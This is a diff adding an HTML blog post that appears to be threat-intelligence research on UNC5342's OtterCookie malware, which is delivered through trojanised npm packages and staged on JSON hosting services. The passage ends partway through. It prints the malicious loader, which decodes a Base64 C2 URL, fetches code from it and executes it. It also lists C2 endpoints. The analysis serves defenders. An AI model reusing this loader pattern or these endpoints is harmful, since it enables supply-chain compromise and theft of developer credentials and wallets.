@@ -1,0 +1,1116 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Threat intelligence and malware analysis research">
+      
+      
+        <meta name="author" content="V0lundr">
+      
+      
+        <link rel="canonical" href="https://v0lundr.github.io/blog/unc5342-refines-ottercookie-delivery-chain-with-jsonsilo-infrastructure/">
+      
+      
+        <link rel="prev" href="../unc5342-npm-malware-uses-custom-headers-to-gate-malicious-payload/">
+      
+      
+        <link rel="next" href="../muddywater-word-macros-ghostfetch/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>UNC5342 Refines OtterCookie Delivery Chain with JsonSilo Infrastructure - V0lundr</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="amber">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#unc5342-refines-ottercookie-delivery-chain-with-jsonsilo-infrastructure" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+<header class="site-header">
+  <div class="site-header__inner">
+
+    <!-- Left: handle -->
+    <a href="https://v0lundr.github.io/" class="site-header__logo">
+      // V0lundr
+    </a>
+
+    <!-- Centre: nav links -->
+    <nav class="site-header__nav">
+      <a href="https://v0lundr.github.io/" class="site-header__link ">Home</a>
+      <a href="https://v0lundr.github.io/about/" class="site-header__link ">About</a>
+    </nav>
+
+    <!-- Right: search -->
+    <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  </div>
+</header>
+
+<style>
+  /* ── KILL DEFAULT HEADER & TABS ─────────────────────────── */
+  .md-header { display: none !important; }
+  .md-tabs   { display: none !important; }
+
+  /* ── CUSTOM HEADER ──────────────────────────────────────── */
+
+  .site-header {
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    background: rgba(7,9,15,0.95);
+    border-bottom: 1px solid #1e2535;
+    backdrop-filter: blur(12px);
+  }
+
+  .site-header__inner {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 2rem;
+    height: 52px;
+    display: flex;
+    align-items: center;
+    gap: 2rem;
+  }
+
+  /* Handle / logo */
+  .site-header__logo {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.85rem;
+    font-weight: 400;
+    letter-spacing: 0.06em;
+    color: #e8a84c;
+    text-decoration: none;
+    white-space: nowrap;
+    flex-shrink: 0;
+  }
+
+  /* Nav links */
+  .site-header__nav {
+    display: flex;
+    align-items: center;
+    gap: 0.25rem;
+    flex: 1;
+  }
+
+  .site-header__link {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.68rem;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: #8898b0;
+    text-decoration: none;
+    padding: 0.3rem 0.7rem;
+    border-radius: 2px;
+    transition: color 0.15s, background 0.15s;
+  }
+
+  .site-header__link:hover {
+    color: #e8a84c;
+    background: rgba(232,168,76,0.06);
+  }
+
+  .site-header__link.active {
+    color: #e8a84c;
+  }
+
+  /* Search — override Material defaults to fit our bar */
+  .md-search {
+    flex-shrink: 0;
+  }
+
+  .md-search__form {
+    background: #0d1119 !important;
+    border: 1px solid #1e2535 !important;
+    border-radius: 2px !important;
+    height: 32px !important;
+    width: 200px !important;
+  }
+
+  .md-search__form:focus-within {
+    border-color: #e8a84c !important;
+    width: 280px !important;
+    transition: width 0.2s ease;
+  }
+
+  .md-search__input {
+    font-family: 'JetBrains Mono', monospace !important;
+    font-size: 0.75rem !important;
+    color: #c8d0de !important;
+  }
+
+  .md-search__input::placeholder {
+    color: #5a6478 !important;
+  }
+
+  .md-search__icon {
+    color: #5a6478 !important;
+  }
+
+  /* Offset page content so sticky header doesn't overlap */
+  .md-main {
+    padding-top: 0 !important;
+  }
+
+  @media (max-width: 600px) {
+    .site-header__logo { display: none; }
+    .md-search__form { width: 140px !important; }
+  }
+</style>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    document.querySelectorAll("a").forEach(function (link) {
+      if (link.textContent.trim() === "Back to index") {
+        link.setAttribute("href", "/");
+      }
+    });
+  });
+</script>
+
+
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../about/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="V0lundr" class="md-nav__button md-logo" aria-label="V0lundr" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    V0lundr
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    About
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+<nav class="md-nav md-nav--secondary" aria-label="Contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#unc5342-refines-ottercookie-delivery-chain-with-jsonsilo-infrastructure" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        UNC5342 Refines OtterCookie Delivery Chain with JsonSilo Infrastructure
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#background" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Summary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#constant-infrastructure-change" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Constant Infrastructure Change
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#technical-analysis-of-the-staging-mechanism" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Technical Analysis of the Staging Mechanism
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Technical Analysis of the Staging Mechanism">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stealthy-exfiltration-of-developer-secrets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Stealthy Exfiltration of Developer Secrets
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lightweight-rat-capabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lightweight RAT Capabilities
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitre-attck-mapping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MITRE ATT&amp;CK Mapping
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href="../" class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+              <div class="md-post__authors md-typeset">
+                
+                  <div class="md-profile md-post__profile">
+                    <span class="md-author md-author--long">
+                      <img src="https://github.com/V0lundr.png" alt="V0lundr">
+                    </span>
+                    <span class="md-profile__description">
+                      <strong>
+                        
+                          V0lundr
+                        
+                      </strong>
+                      <br>
+                      Threat Intelligence Researcher
+                    </span>
+                  </div>
+                
+              </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
+                        <time datetime="2026-01-08 00:00:00+00:00" class="md-ellipsis">2026-01-08</time>
+                      </div>
+                    </li>
+                    
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
+                          <span class="md-ellipsis">
+                            
+                              8 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
+          
+        </div>
+      </div>
+    </div>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+
+
+  <h1>UNC5342 Refines OtterCookie Delivery Chain with JsonSilo Infrastructure</h1>
+
+<h2 id="unc5342-refines-ottercookie-delivery-chain-with-jsonsilo-infrastructure">UNC5342 Refines OtterCookie Delivery Chain with JsonSilo Infrastructure<a class="headerlink" href="#unc5342-refines-ottercookie-delivery-chain-with-jsonsilo-infrastructure" title="Permanent link">&para;</a></h2>
+<p>While continuing to track DPRK-linked weaponised npm packages, I observed UNC5342
+refining its delivery chain — pivoting away from Vercel infrastructure and adopting
+<code>jsonsilo[.]com</code> and <code>npoint[.]io</code> as payload staging points for the OtterCookie
+malware family.</p>
+<!-- more -->
+
+<h2 id="background">Background<a class="headerlink" href="#background" title="Permanent link">&para;</a></h2>
+<p><strong>UNC5342</strong> (also tracked as Contagious Interview, DeceptiveDevelopment, Famous
+Chollima, and Void Dokkaebi) is a DPRK-nexus threat cluster that has persistently
+targeted software developers since at least 2023 through fake technical interview
+schemes.<sup id="fnref:1"><a class="footnote-ref" href="#fn:1">1</a></sup> The cluster distributes malware via trojanised npm packages, GitHub
+repositories, and coding challenge assignments, focusing on developers in
+cryptocurrency, DeFi, and financial technology sectors.</p>
+<p><strong>OtterCookie</strong> is a JavaScript-based infostealer and lightweight RAT attributed to
+UNC5342, first observed in real-world attacks in September 2024.<sup id="fnref:2"><a class="footnote-ref" href="#fn:2">2</a></sup> Unlike its
+companion implant BeaverTail — which functions as a downloader — OtterCookie is
+explicitly designed for deep credential theft and interactive remote access, targeting
+developer-specific secrets including <code>.env</code> files, private keys, clipboard contents,
+and cryptocurrency wallet data. The malware operates as a multi-module framework,
+spawning independent Node.js processes for each major capability.</p>
+<p><strong>JsonSilo and npoint.io</strong> are legitimate JSON storage hosting services designed to
+allow developers to quickly host and access JSON data via API without server setup.
+By November 2025, NVISO researchers publicly documented UNC5342 abusing these
+platforms — alongside JSON Keeper — to stage obfuscated payloads, blending malicious
+traffic with legitimate developer API calls.<sup id="fnref:3"><a class="footnote-ref" href="#fn:3">3</a></sup> The research here predates that
+public reporting by approximately six weeks, representing an early sighting of this
+infrastructure shift.</p>
+<h2 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">&para;</a></h2>
+<p>This research analyses UNC5342's shift to <code>jsonsilo[.]com</code> and <code>npoint[.]io</code> for
+distributing OtterCookie via weaponised npm packages. The delivery chain pivots
+from the Vercel-based gating mechanism <a href="unc5342-npm-malware-uses-custom-headers-to-gate-malicious-payload.md">documented in December 2025</a>
+to JSON storage services as a new staging layer. The report provides technical
+insights into the malware's staging mechanism, obfuscation approach, and exfiltration
+capabilities for network defenders and incident responders.</p>
+<p><strong>Key highlights:</strong></p>
+<ul>
+<li>UNC5342 pivoted from Vercel infrastructure to <code>jsonsilo[.]com</code> and <code>npoint[.]io</code>
+  for payload hosting and distribution</li>
+<li>The malicious npm package <code>express-lists-routes</code> disguises OtterCookie as a
+  legitimate Express.js utility</li>
+<li>OtterCookie creates a persistent access pipeline by systematically harvesting
+  developer secrets — <code>.env</code> files, cryptocurrency private keys, and clipboard data</li>
+</ul>
+<h2 id="constant-infrastructure-change">Constant Infrastructure Change<a class="headerlink" href="#constant-infrastructure-change" title="Permanent link">&para;</a></h2>
+<p>In January 2026, I identified UNC5342 adopting <code>jsonsilo[.]com</code> and <code>npoint[.]io</code>
+as primary distribution points for malicious payloads. Both are legitimate
+developer-oriented JSON hosting services — the kind that generate zero suspicion in
+a developer's network traffic. This shift follows my December 2025 research into the
+cluster's use of Vercel infrastructure to gate and serve the OtterCandy malware
+family.</p>
+<p>By rotating away from Vercel and onto JSON storage services, UNC5342 demonstrates
+a persistent commitment to exploiting developer-trusted platforms while evading
+ongoing infrastructure tracking. NVISO later confirmed this tactic more broadly,
+noting that UNC5342 operators were using JSON Keeper, JSONsilo, and npoint.io
+interchangeably across different campaign waves.<sup id="fnref2:3"><a class="footnote-ref" href="#fn:3">3</a></sup></p>
+<p>The identified npm package — <code>express-lists-routes</code> — is the latest example of
+UNC5342's sustained reliance on weaponised npm packages as an initial access
+mechanism. By embedding malware in a package that appears to provide routine
+Express.js route listing functionality, the threat actor ensures automatic code
+execution at install time while blending into a legitimate supply chain.</p>
+<figure>
+  <img src="../images/Pasted image 20260120105248.png" alt="Exhibit 1: Weaponised NPM Package" />
+  <figcaption>Exhibit 1: Weaponised NPM Package (Source: npmjs.com)</figcaption>
+</figure>
+
+<figure>
+  <img src="../images/Pasted image 20260120105256.png" alt="Exhibit 2: Base64 JsonSilo.com Dropper C2" />
+  <figcaption>Exhibit 2: Base64-encoded JsonSilo.com Dropper C2</figcaption>
+</figure>
+
+<figure>
+  <img src="../images/Pasted image 20260120105304.png" alt="Exhibit 3: Decoded Base64 JsonSilo.com Dropper C2" />
+  <figcaption>Exhibit 3: Decoded Base64 JsonSilo.com Dropper C2 (hxxps://api.jsonsilo[.]com/public/a8505bba-c743-4794-867a-a0bf41940c78)</figcaption>
+</figure>
+
+<figure>
+  <img src="../images/Pasted image 20260120105311.png" alt="Exhibit 4: JsonSilo Second Stage OtterCookie Payload" />
+  <figcaption>Exhibit 4: JsonSilo.com Second Stage OtterCookie Payload</figcaption>
+</figure>
+
+<p>Additional weaponised packages and their corresponding C2 endpoints identified
+during this investigation:</p>
+<table>
+<thead>
+<tr>
+<th>Package</th>
+<th>C2 Endpoint</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>hxxps://www.npmjs[.]com/package/chai-as-executed</code></td>
+<td><code>hxxps://api.npoint[.]io/979f369bee438a98751e</code></td>
+</tr>
+<tr>
+<td><code>hxxps://www.npmjs[.]com/package/chai-as-enhanced</code></td>
+<td><code>hxxps://api.jsonsilo[.]com/public/cc268b04-1284-45d9-9bdc-952c4f8cf983</code></td>
+</tr>
+</tbody>
+</table>
+<p>The <code>chai-as-executed</code> package is particularly notable. The malicious logic encodes
+the C2 URL as a Base64 string stored inside a fake environment variable, then
+decodes and fetches it at runtime using <code>axios</code>:</p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">  </span><span class="nx">env</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nx">DEV_API_KEY</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;aHR0cHM6Ly9hcGkubnBvaW50LmlvLzk3OWYzNjliZWU0MzhhOTg3NTFl&quot;</span><span class="p">,</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span><span class="nx">DEV_SECRET_KEY</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;eC1zZWNyZXQta2V5&quot;</span><span class="p">,</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span><span class="nx">DEV_SECRET_VALUE</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;Xw==&quot;</span><span class="p">,</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="p">};</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">getCallers</span><span class="p">(...</span><span class="nx">_args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">atob</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">DEV_API_KEY</span><span class="p">);</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">atob</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">DEV_SECRET_KEY</span><span class="p">);</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">v</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">atob</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">DEV_SECRET_VALUE</span><span class="p">);</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">retrycnt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5</span><span class="p">;</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nx">retrycnt</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="w">      </span><span class="kd">const</span><span class="w"> </span><span class="nx">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">await</span><span class="w"> </span><span class="nx">axios</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">src</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="nx">k</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="nx">v</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">})).</span><span class="nx">data</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="w">      </span><span class="kd">const</span><span class="w"> </span><span class="nx">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Function</span><span class="p">.</span><span class="kr">constructor</span><span class="p">(</span><span class="s2">&quot;require&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">s</span><span class="p">);</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="w">      </span><span class="nx">handler</span><span class="p">(</span><span class="nx">require</span><span class="p">);</span>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="w">      </span><span class="k">break</span><span class="p">;</span>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">retrycnt</span><span class="o">--</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="p">})();</span>
+</span></code></pre></div>
+<p>Decoding <code>DEV_API_KEY</code> yields <code>hxxps://api.npoint[.]io/979f369bee438a98751e</code> — the
+npoint.io C2 endpoint. The custom header (<code>x-secret-key: _</code>) echoes the same
+authentication gating pattern observed in the December 2025 campaign, here applied
+to the npoint.io resolver rather than Vercel.</p>
+<h2 id="technical-analysis-of-the-staging-mechanism">Technical Analysis of the Staging Mechanism<a class="headerlink" href="#technical-analysis-of-the-staging-mechanism" title="Permanent link">&para;</a></h2>
+<p>The malicious payload uses a multi-layered obfuscation strategy designed to hinder
+static analysis and evade automated detection. The outer layer uses a heavily modified
+JavaScript obfuscator employing control flow flattening, string array rotation, and
+anti-tampering regex checks.</p>
+<p>OtterCookie is explicitly architected as a multi-module framework — each major
+capability runs as an independent detached Node.js process, managed through lock
+files and PID tracking. The main entry point spawns three separate malicious
+components, each with its own lock file and role.</p>
+<figure>
+  <img src="../images/Pasted image 20260120105348.png" alt="Exhibit 5: Lock Components with their Own Lock Files" />
+  <figcaption>Exhibit 5: Lock Components with their Own Lock Files</figcaption>
+</figure>
+
+<figure>
+  <img src="../images/Pasted image 20260120105354.png" alt="Exhibit 6: OtterCookie Components" />
+  <figcaption>Exhibit 6: OtterCookie Components</figcaption>
+</figure>
+
+<p>Upon successful execution, the outer wrapper decrypts and executes three distinct
+payloads stored as large string variables — identified during analysis as <code>v38</code>,
+<code>v39</code>, and <code>v40</code> — containing the core logic for credential theft, file exfiltration,
+and remote access respectively. These strings are written to lock files in the
+temporary directory to manage execution flow and prevent conflicting instances.</p>
+<h3 id="stealthy-exfiltration-of-developer-secrets">Stealthy Exfiltration of Developer Secrets<a class="headerlink" href="#stealthy-exfiltration-of-developer-secrets" title="Permanent link">&para;</a></h3>
+<p>OtterCookie's primary capability is systematic discovery and exfiltration of sensitive
+developer data — credentials, configuration secrets, source code, and private keys.
+This is consistent with the broader UNC5342 toolset, including BeaverTail,
+InvisibleFerret, and OtterCandy, which form a coordinated attack pipeline designed
+to compromise developers at scale through social engineering and systematically
+exfiltrate high-value assets.<sup id="fnref2:2"><a class="footnote-ref" href="#fn:2">2</a></sup></p>
+<p>The malware defines large sets of sensitive keywords applied to full file paths to
+identify files likely to contain credentials, cryptographic material, wallets, tokens,
+or proprietary data. Aggressive exclusion of system directories, dependency folders,
+and media files demonstrates clear intent to optimise for high-value theft rather than
+indiscriminate collection.</p>
+<figure>
